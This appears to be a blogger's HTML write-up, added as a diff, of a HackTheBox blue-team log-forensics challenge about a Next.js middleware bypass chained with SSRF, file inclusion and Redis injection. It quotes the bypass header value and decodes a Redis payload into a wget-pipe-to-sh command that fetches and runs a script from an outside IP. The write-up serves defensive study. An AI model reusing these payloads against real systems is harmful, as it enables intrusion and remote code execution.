@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <script type="application/javascript" src='http://localhost:1313/js/theme-mode.js'></script>
+    <link rel="stylesheet" href='http://localhost:1313/css/frameworks.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github.min.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/github-style.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/light.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/dark.css' />
+    <link rel="stylesheet" href='http://localhost:1313/css/syntax.css' />
+    <title>NeuroSync-D Sherlocks - Peter Wambua&#39;s blog</title>
+    
+    <link rel="icon" type="image/x-icon" href='http://localhost:1313/images/favicon.ico'>
+    
+    <meta name="theme-color" content="#1e2327">
+
+    
+    
+
+    
+    <meta name="description"
+  content="NeuroSync-D Sherlocks Challenge This is a write-up about the challenge NeuroSync-D, which is part of the Sherlocks challenges in HackTheBox focused on improving learners&amp;rsquo; proficiency in blue team security. As a web pentester, I honestly love investigating web attacks. Feels just like home, and this challenge was no different
+Description: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems." />
+<meta name="keywords"
+  content='' />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="http://localhost:1313/post/neurosync-d/" />
+
+
+<meta name="twitter:card" content="summary" />
+<meta name="twitter:title" content="NeuroSync-D Sherlocks - Peter Wambua&#39;s blog" />
+<meta name="twitter:description"
+  content="NeuroSync-D Sherlocks Challenge This is a write-up about the challenge NeuroSync-D, which is part of the Sherlocks challenges in HackTheBox focused on improving learners&amp;rsquo; proficiency in blue team security. As a web pentester, I honestly love investigating web attacks. Feels just like home, and this challenge was no different
+Description: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems." />
+<meta name="twitter:site" content="http://localhost:1313/" />
+<meta name="twitter:creator" content="" />
+<meta name="twitter:image"
+  content="http://localhost:1313/">
+
+
+<meta property="og:type" content="article" />
+<meta property="og:title" content="NeuroSync-D Sherlocks - Peter Wambua&#39;s blog">
+<meta property="og:description"
+  content="NeuroSync-D Sherlocks Challenge This is a write-up about the challenge NeuroSync-D, which is part of the Sherlocks challenges in HackTheBox focused on improving learners&amp;rsquo; proficiency in blue team security. As a web pentester, I honestly love investigating web attacks. Feels just like home, and this challenge was no different
+Description: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems." />
+<meta property="og:url" content="http://localhost:1313/post/neurosync-d/" />
+<meta property="og:site_name" content="NeuroSync-D Sherlocks" />
+<meta property="og:image"
+  content="http://localhost:1313/">
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+<meta property="article:published_time" content="2025-07-25 02:49:05 -0400 EDT" />
+
+
+
+
+
+
+
+
+
+
+
+</head>
+
+
+<body>
+  <div style="position: relative">
+  <header class="Header js-details-container Details px-3 px-md-4 px-lg-5 flex-wrap flex-md-nowrap open Details--on">
+    <div class="Header-item mobile-none" style="margin-top: -4px; margin-bottom: -4px;">
+      <a class="Header-link" href="http://localhost:1313/">
+        <img class="octicon" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item d-md-none">
+      <button class="Header-link btn-link js-details-target" type="button"
+        onclick="document.querySelector('#header-search').style.display = document.querySelector('#header-search').style.display == 'none'? 'block': 'none'">
+        <svg height="24" class="octicon octicon-three-bars" viewBox="0 0 16 16" version="1.1" width="24">
+          <path fill-rule="evenodd" d="M1 2.75A.75.75 0 011.75 2h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 2.75zm0 5A.75.75 0 011.75 7h12.5a.75.75 0 110 1.5H1.75A.75.75 0 011 7.75zM1.75 12a.75.75 0 100 1.5h12.5a.75.75 0 100-1.5H1.75z">
+          </path>
+        </svg>
+      </button>
+    </div>
+    <div style="display: none;" id="header-search"
+      class="Header-item Header-item--full flex-column flex-md-row width-full flex-order-2 flex-md-order-none mr-0 mr-md-3 mt-3 mt-md-0 Details-content--hidden-not-important d-md-flex">
+      <div
+        class="Header-search header-search flex-auto js-site-search position-relative flex-self-stretch flex-md-self-auto mb-3 mb-md-0 mr-0 mr-md-3 scoped-search site-scoped-search js-jump-to">
+        <div class="position-relative">
+          
+          <form target="_blank" action="https://www.google.com/search" accept-charset="UTF-8" method="get"
+            autocomplete="off">
+            <label
+              class="Header-search-label form-control input-sm header-search-wrapper p-0 js-chromeless-input-container header-search-wrapper-jump-to position-relative d-flex flex-justify-between flex-items-center">
+              <input type="text"
+                class="Header-search-input form-control input-sm header-search-input jump-to-field js-jump-to-field js-site-search-focus js-site-search-field is-clearable"
+                name="q" value="" placeholder="Search" autocomplete="off">
+              <input type="hidden" name="q" value="site:http://localhost:1313/">
+            </label>
+          </form>
+          
+        </div>
+      </div>
+    </div>
+
+    <div class="Header-item Header-item--full flex-justify-center d-md-none position-relative">
+      <a class="Header-link " href="http://localhost:1313/">
+        <img class="octicon octicon-mark-github v-align-middle" height="32" width="32" src="">
+      </a>
+    </div>
+    <div class="Header-item" style="margin-right: 0;">
+      <a href="javascript:void(0)" class="Header-link no-select" onclick="switchTheme()">
+        <svg style="fill: var(--color-profile-color-modes-toggle-moon);" class="no-select" viewBox="0 0 16 16"
+          version="1.1" width="16" height="16">
+          <path fill-rule="evenodd" clip-rule="evenodd"
+            d="M4.52208 7.71754C7.5782 7.71754 10.0557 5.24006 10.0557 2.18394C10.0557 1.93498 10.0392 1.68986 10.0074 1.44961C9.95801 1.07727 10.3495 0.771159 10.6474 0.99992C12.1153 2.12716 13.0615 3.89999 13.0615 5.89383C13.0615 9.29958 10.3006 12.0605 6.89485 12.0605C3.95334 12.0605 1.49286 10.001 0.876728 7.24527C0.794841 6.87902 1.23668 6.65289 1.55321 6.85451C2.41106 7.40095 3.4296 7.71754 4.52208 7.71754Z">
+          </path>
+        </svg>
+      </a>
+    </div>
+  </header>
+</div>
+
+  <div id="search-result" class="container-lg px-3 new-discussion-timeline" style="display: none;">
+</div>
+
+  
+<div class="application-main">
+  <div>
+  <main>
+    <div class="gisthead pagehead bg-gray-light pb-0 pt-3 mb-4">
+      <div class="px-0">
+        <div class="mb-3 d-flex px-3 px-md-3 px-lg-5">
+          <div class="flex-auto min-width-0 width-fit mr-3">
+            <div class="d-flex">
+              <div class="d-none d-md-block">
+                <a class="avatar mr-2 flex-shrink-0" href="http://localhost:1313/">
+                  <img class=" avatar-user"
+                    src="/images/profile.png"
+                    width="32" height="32"></a>
+              </div>
+              <div class="d-flex flex-column">
+                <h1 class="break-word f3 text-normal mb-md-0 mb-1">
+                  <span class="author">
+                    <a href="http://localhost:1313/">Peter Wambua</a>
+                  </span>
+                  <span class="path-divider">/</span>
+                  <strong class="css-truncate css-truncate-target mr-1" style="max-width: 410px">
+                    <a href="http://localhost:1313/post/neurosync-d/">NeuroSync-D Sherlocks</a>
+                  </strong>
+                </h1>
+                <div class="note m-0">
+                  Created <relative-time datetime="Fri, 25 Jul 2025 02:49:05 -0400"
+                    class="no-wrap">
+                    Fri, 25 Jul 2025 02:49:05 -0400</relative-time>
+
+                  
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="container-lg px-3 new-discussion-timeline">
+      <div class="repository-content gist-content">
+        <div>
+          <div class="js-gist-file-update-container js-task-list-container file-box">
+            <div id="file-pytest" class="file my-2">
+              <div id="post-header" class="file-header d-flex flex-md-items-center flex-items-start sticky-header" style="z-index: 2">
+                <div class="file-info d-flex flex-md-items-center flex-items-start flex-order-1 flex-auto">
+                  <div class="text-mono f6 flex-auto pr-3 flex-order-2 flex-md-order-1 mt-2 mt-md-0">
+                    
+                    <summary id="toc-toggle" onclick="clickToc()" class="btn btn-octicon m-0 mr-2 p-2">
+                      <svg aria-hidden="true" viewBox="0 0 16 16" height="16" width="16" class="octicon octicon-list-unordered">
+                        <path fill-rule="evenodd" d="M2 4a1 1 0 100-2 1 1 0 000 2zm3.75-1.5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zm0 5a.75.75 0 000 1.5h8.5a.75.75 0 000-1.5h-8.5zM3 8a1 1 0 11-2 0 1 1 0 012 0zm-1 6a1 1 0 100-2 1 1 0 000 2z"></path>
+                      </svg>
+                    </summary>
+                    <details-menu class="SelectMenu" id="toc-details" style="display: none;">
+                      <div class="SelectMenu-modal rounded-3 mt-1" style="max-height: 340px;">
+                        <div class="SelectMenu-list SelectMenu-list--borderless p-2" style="overscroll-behavior: contain;" id="toc-list">
+                        </div>
+                      </div>
+                    </details-menu>
+                      847 Words
+                    
+
+                  </div>
+                  <div class="file-actions flex-order-2 pt-0">
+                    
+                  </div>
+                </div>
+              </div>
+
+
+              <div class="Box-body px-5 pb-5" style="z-index: 1">
+                <article class="markdown-body entry-content container-lg"><h1 id="neurosync-d-sherlocks-challenge">NeuroSync-D Sherlocks Challenge</h1>
+<p><img src="/images/neurosync-d/neurosync-d.png" alt="">
+<em>This is a write-up about the challenge NeuroSync-D, which is part of the Sherlocks challenges in HackTheBox focused on improving learners&rsquo; proficiency in blue team security. As a web pentester, I honestly love investigating web attacks. Feels just like home, and this challenge was no different</em></p>
+<blockquote>
+<p>Description: NeuroSync™ is a leading suite of products focusing on developing cutting edge medical BCI devices, designed by the Korosaki Coorporaton. Recently, an APT group targeted them and was able to infiltrate their infrastructure and is now moving laterally to compromise more systems. It appears that they have even managed to hijack a large number of online devices by exploiting an N-day vulnerability. Your task is to find out how they were able to compromise the infrastructure and understand how to secure it.</p>
+</blockquote>
+<p>We are provided with 5 log files: access, bci-device, data-api, interface, and redis. We will navigate through all this throughout the investigation.</p>
+<p><strong>Task 1: What version of Next.js is the application using?</strong></p>
+<blockquote>
+<p>Looking at the interface, we see the application loading and the Next.js version indicated
+<img src="/images/neurosync-d/task1.png" alt=""></p>
+</blockquote>
+<p><strong>Task 2: What local port is the Next.js-based application running on?</strong></p>
+<blockquote>
+<p>Just below the version, we can see the application running on port 3000</p>
+</blockquote>
+<p><strong>Task 3: A critical Next.js vulnerability was released in March 2025, and this version appears to be affected. What is the CVE identifier for this vulnerability?</strong></p>
+<blockquote>
+<p>Digging through the interface logs and following the attack methodology of the attack, we can see an attack happening from 11:37:59. The attack is clearly the Next.js Middleware Authorization Bypass Attack, where the attacker added the x-middleware-subrequest header and added more values to make exceed the MAX_RECURSION_DEPTH, which is set to 5 max, achieving authorization. This, is CVE-2025-29927.
+<img src="/images/neurosync-d/task3.png" alt=""></p>
+</blockquote>
+<p><strong>Task 4: The attacker tried to enumerate some static files that are typically available in the Next.js framework, most likely to retrieve its version. What is the first file he could get?</strong></p>
+<blockquote>
+<p>Looking at the access.log, we can see the attacker starts enumeration by sending requests to /next/static/chunks, a folder he knows exists. He gets a couple of 404s, but lands on a valid file: main-app.js
+<img src="/images/neurosync-d/task4.png" alt=""></p>
+</blockquote>
+<p><strong>Task 5: Then the attacker appears to have found an endpoint that is potentially affected by the previously identified vulnerability. What is that endpoint?</strong></p>
+<blockquote>
+<p>Just after finding that, we see he sends a request to /static/chunks/app/page.js, then gets an endpoint that he starts fully dealing with: /api/bci/analytics</p>
+</blockquote>
+<p><strong>Task 6: How many requests to this endpoint have resulted in an &ldquo;Unauthorized&rdquo; response?</strong></p>
+<blockquote>
+<p>From the logs, we can see the attacker sending 5 requests that result in a 401 response, then gets a 200 response.
+<img src="/images/neurosync-d/task6.png" alt=""></p>
+</blockquote>
+<p><strong>Task 7: When is a successful response received from the vulnerable endpoint, meaning that the middleware has been bypassed?</strong></p>
+<blockquote>
+<p>From the 200 in the screenshot above, we can see the first successful request being made at: 2025-04-01 11:38:05</p>
+</blockquote>
+<p><strong>Task 8: Given the previous failed requests, what will most likely be the final value for the vulnerable header used to exploit the vulnerability and bypass the middleware?</strong></p>
+<blockquote>
+<p>Navigate to the interface logs. Match the time the requests where made and you can see them, where he was gradually adding middleware to the x-middleware-subrequest. Since the last unsuccessful request was [&ldquo;x-middleware-subrequest&rdquo;,&ldquo;middleware:middleware:middleware:middleware&rdquo;], and we know the MAX_RECURSION_DEPTH is usually 5, hence the next exploited the endpoint successfully: x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
+<img src="/images/neurosync-d/task8.png" alt=""></p>
+</blockquote>
+<p><strong>Task 9: The attacker chained the vulnerability with an SSRF attack, which allowed them to perform an internal port scan and discover an internal API. On which port is the API accessible?</strong></p>
+<blockquote>
+<p>Looking at the data-api.log, we see the api being accessed and bruteforced. It exists on port 4000 as seen
+<img src="/images/neurosync-d/task9.png" alt=""></p>
+</blockquote>
+<p><strong>Task 10: After the port scan, the attacker starts a brute-force attack to find some vulnerable endpoints in the previously identified API. Which vulnerable endpoint was found?</strong></p>
+<blockquote>
+<p>From the above screenshot, the logs show that the bruteforce was successful on the endpoint /logs, and log file is read successfully.</p>
+</blockquote>
+<p><strong>Task 11: When the vulnerable endpoint found was used maliciously for the first time?</strong></p>
+<blockquote>
+<p>Just below it was found, we see the attacker performing a local file inclusion attack on the endpoint, exactly at: 2025-04-01 11:39:01</p>
+</blockquote>
+<p><strong>Task 12: What is the attack name the endpoint is vulnerable to?</strong></p>
+<blockquote>
+<p>Well, that&rsquo;s a nobrainer is it? Local File Inclusion</p>
+</blockquote>
+<p><strong>Task 13: What is the name of the file that was targeted the last time the vulnerable endpoint was exploited?</strong></p>
+<blockquote>
+<p>The attacker tries a couple of files before landing on the last and successful one, secret.key
+<img src="/images/neurosync-d/task13.png" alt=""></p>
+</blockquote>
+<p><strong>Task 14: Finally, the attacker uses the sensitive information obtained earlier to create a special command that allows them to perform Redis injection and gain RCE on the system. What is the command string?</strong></p>
+<blockquote>
+<p>Since this was perfomed on the Redis server, go to the redis.log and observe the unusual commands. We find the following: OS_EXEC|d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo|f1f0c1feadb5abc79e700cac7ac63cccf91e818ecf693ad7073e3a448fa13bbb
+<img src="/images/neurosync-d/task14.png" alt=""></p>
+</blockquote>
+<p><strong>Task 15: Once decoded, what is the command?</strong></p>
+<blockquote>
+<p>Go to <a href="https://gchq.github.io/CyberChef">Cybechef</a> and decode this. Or if you like the terminal just as you like me, decode this by simply:</p>
+</blockquote>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ echo &#34;d2dldCBodHRwOi8vMTg1LjIwMi4yLjE0Ny9oNFBsbjQvcnVuLnNoIC1PLSB8IHNo&#34; | base64 -d                                                                                           
+wget http://185.202.2.147/h4Pln4/run.sh -O- | sh
+</code></pre><p>Such an amazing challenge fr fr!!👽😎</p>
+</article>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </main>
+</div>
+<script type="application/javascript" src='http://localhost:1313/js/toc.js'></script>
+<link rel="stylesheet" href='http://localhost:1313/css/toc.css' />
+
+  
+</div>
+
+  <div class="footer container-xl width-full p-responsive">
+  <div
+    class="position-relative d-flex flex-row-reverse flex-lg-row flex-wrap flex-lg-nowrap flex-justify-center flex-lg-justify-between flex-sm-items-center pt-6 pb-2 mt-6 f6 text-gray border-top border-gray-light ">
+    <a aria-label="Homepage" title="GitHub" class="footer-octicon d-none d-lg-block mr-lg-4" href="http://localhost:1313/">
+      <svg height="24" class="octicon octicon-mark-github" viewBox="0 0 16 16" version="1.1" width="24">
+        <path fill-rule="evenodd"
+          d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z">
+        </path>
+      </svg>
+    </a>
+    <ul class="list-style-none d-flex flex-wrap col-12 flex-justify-center flex-lg-justify-between mb-2 mb-lg-0">
+      
+      <li class="mr-3 mr-lg-0">Theme by <a href='https://github.com/MeiK2333/github-style'>github-style</a></li>
+      
+      <li class="mr-3 mr-lg-0">GitHub and the Invertocat logo are trademarks of <a href="https://github.com/">GitHub, Inc.</a></li>
+    </ul>
+  </div>
+  <div class="d-flex flex-justify-center pb-6">
+    <span class="f6 text-gray-light"></span>
+  </div>
+
+
+</div>
+
+</body>
+
+<script type="application/javascript" src="http://localhost:1313/js/github-style.js"></script>
+
+
+
+
+
+
+
+</html>
